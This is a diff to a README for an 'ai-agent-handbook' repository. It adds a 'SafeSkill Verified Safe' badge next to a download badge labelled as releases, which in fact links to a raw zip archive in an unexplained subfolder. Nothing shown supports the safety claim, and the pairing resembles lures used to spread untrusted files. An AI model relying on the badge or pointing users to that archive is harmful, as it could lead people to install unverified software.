@@ -1,6 +1,7 @@
 # 🧠 ai-agent-handbook - Learn How AI Agents Work
 
 [![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Celestinainstitutional109/ai-agent-handbook/raw/refs/heads/main/lanner/ai-agent-handbook-v1.3.zip)
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/celestinainstitutional109-ai-agent-handbook)
 
 ## 📘 What this is
 
